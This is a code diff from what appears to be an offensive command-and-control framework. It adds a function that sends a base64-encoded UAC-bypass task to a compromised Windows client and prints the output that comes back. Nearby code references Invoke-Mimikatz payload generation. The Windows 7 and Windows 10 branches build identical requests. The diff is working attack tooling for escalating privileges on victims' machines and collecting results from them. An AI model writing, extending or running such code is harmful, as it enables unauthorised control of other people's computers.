@@ -160,3 +160,25 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     except KeyboardInterrupt:
         pass
     return "pass"
+
+def UACBypassGeneration(payloadchoice,payloadname):
+    win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
+    if not win7orwin10:
+        win7orwin10 = "10"
+    if win7orwin10 == "7":
+        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
+    else:
+        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
+    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
+    from stager import returnServerList
+    try:
+        for server in returnServerList():
+            while True:
+                if server.handlers[clientnumber].in_buffer:
+                    print server.handlers[clientnumber].in_buffer.pop()
+                    break
+                else:
+                    time.sleep(0.1)
+    except KeyboardInterrupt:
+        pass
+    return "pass"
